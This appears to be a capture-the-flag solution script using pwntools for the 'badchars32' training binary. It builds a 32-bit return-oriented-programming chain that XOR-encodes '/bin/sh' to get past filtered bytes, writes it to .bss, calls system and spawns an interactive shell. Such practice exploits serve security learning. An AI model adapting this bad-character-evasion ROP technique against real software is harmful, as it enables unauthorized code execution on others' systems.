#!/usr/bin/env python
# Author : 0xsegf
# https://github.com/arjunshibu
# https://www.hackthebox.eu/home/users/profile/201892
from pwn import *

rop = cyclic(44)
rop += p32(0x08048899)          # pop esi; pop edi; ret
rop += '-`kl'                   # '/bin' xor 2
rop += p32(0x0804a040)          # .bss section to write into
rop += p32(0x08048893)          # mov DWORD PTR [edi],esi; ret
for i in range(4):
    rop += p32(0x08048896)      # pop ebx; pop ecx; ret
    rop += p32(0x0804a040+i)    # xor each byte points to .bss with 2
    rop += p32(0x2)
    rop += p32(0x08048890)      # xor BYTE PTR [ebx],cl; ret
rop += p32(0x08048899)          # pop esi; pop edi; ret
rop += '-qj9'                   # '/sh' xor 2
rop += p32(0x0804a040+4)        # .bss section to write into 
rop += p32(0x08048893)          # mov DWORD PTR [edi],esi; ret
for i in range(4, 8):
    rop += p32(0x08048896)      # pop ebx; pop ecx; ret
    rop += p32(0x0804a040+i)    # xor each byte points to .bss with 2
    rop += p32(0x2)
    rop += p32(0x08048890)      # xor BYTE PTR [ebx],cl; ret
rop += p32(0x080484e0)          # system
rop += cyclic(4)                # exit address (doesnt matter)
rop += p32(0x0804a040)          # final '/bin/sh'

p = process('./badchars32')
p.sendline(rop)
p.interactive()
